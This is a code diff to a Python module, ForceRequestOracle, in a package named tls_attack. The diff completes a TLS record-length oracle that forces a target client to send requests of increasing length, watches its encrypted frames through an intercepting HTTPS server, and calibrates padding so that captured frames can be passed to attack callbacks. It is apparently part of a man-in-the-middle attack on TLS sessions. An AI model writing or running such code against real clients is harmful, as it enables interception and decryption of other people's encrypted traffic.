@@ -1,4 +1,5 @@
 import logging
+import traceback
 
 from tls_attack.structure.TLSHeader import *
 from tls_attack.structure.TLSSource import *
@@ -8,7 +9,7 @@ class ForceRequestOracle:
     INIT_STEP_COUNT    = 65
 
     def __init__(self, force_request, https_server, target_client_ip, target_server_host):
-        self.force_request = force_request
+        self.force_request_module = force_request
         self.https_server = https_server
         self.is_started = False
         self.ready = False
@@ -20,7 +21,7 @@ class ForceRequestOracle:
     def start(self):
         if not self.is_started:
             self.https_server.on_packet_received(self._https_handler)
-            self.force_request.start()
+            self.force_request_module.start()
             self.https_server.start()
             self.is_started = True
             self._init()
@@ -41,14 +42,11 @@ class ForceRequestOracle:
 
         # Force the next request
         self._init_step += 1
-        self.force_request.force_request(self.target_ip, self.base_url + b"/" + b"A"*self._init_step, callback = self._init_callback)
+        self.force_request_module.force_request(self.target_ip, self.base_url + b"/" + b"A"*self._init_step, b"", self._init_callback)
 
     def _init_callback(self, id):
         for frame in self.tls_frames:
             self._init_stats.append({ "step" : self._init_step, "length" : frame.length })
-
-        print("Frames %d" % self._init_step)
-        print(self.tls_frames)
 
         if self._init_step < ForceRequestOracle.INIT_STEP_COUNT:
             self._init_step_fct()
@@ -125,9 +123,15 @@ class ForceRequestOracle:
         # URL and empty POST data.
         self.base_length = base_size - boundary
 
-        print(self.base_length, boundary, self.block_size)
+        # Start the actual forced request.
+        self.ready = True
+        self._process_next()
 
-    def force(self, url, post_data, callback):
+    def force_request(self, url, post_data, callback):
+        # The expected length is calibrated with having a none "None" value
+        if post_data == None:
+            post_data = b""
+
         self.queue.append({ "url" : url, "post_data" : post_data, "callback" : callback })
 
         # If we are not ready or there's already an element being
@@ -136,10 +140,47 @@ class ForceRequestOracle:
             self._process_next()
 
     def _process_next(self):
-        pass
+        if len(self.queue) == 0:
+            return
+
+        url = self.queue[0]["url"]
+        post_data = self.queue[0]["post_data"]
+
+        # Message length
+        self.expected_length = len(url) + len(post_data) - 1 + self.base_length
+        
+        # Message length with the padding
+        self.expected_length += self.block_size - (self.expected_length % self.block_size)
+
+        self.tls_frames = []
+        self.force_request_module.force_request(self.target_ip, self.base_url + url, post_data)
 
     def _https_handler(self, connection, structure, state, source):
         if source == TLSSource.CLIENT and structure.content_type == TLSContentType.TLSApplicationData.value:
-            self.tls_frames.append(structure)
-            self.tls_frames = self.tls_frames[-ForceRequestOracle.TLS_HISTORY_LENGTH:]
+            if not self.ready:
+                # In the initialization phase, we just collect the TLS frame
+                # They will later be analyzed	
+                self.tls_frames.append(structure)
+                self.tls_frames = self.tls_frames[-ForceRequestOracle.TLS_HISTORY_LENGTH:]
+            else:
+                # If there's no more item in the queue, there's no processig to
+                # be done here
+                if len(self.queue) == 0:
+                    return
+
+                if structure.length == self.expected_length:
+                    item = self.queue.pop(0)
+                    result = None
+
+                    try:
+                        result = item["callback"](connection, structure, state, source)
+                    except Exception as err:
+                        logging.error(traceback.format_exc())
+
+                    self._process_next()
+
+                    if result:
+                        return result
+
+
 
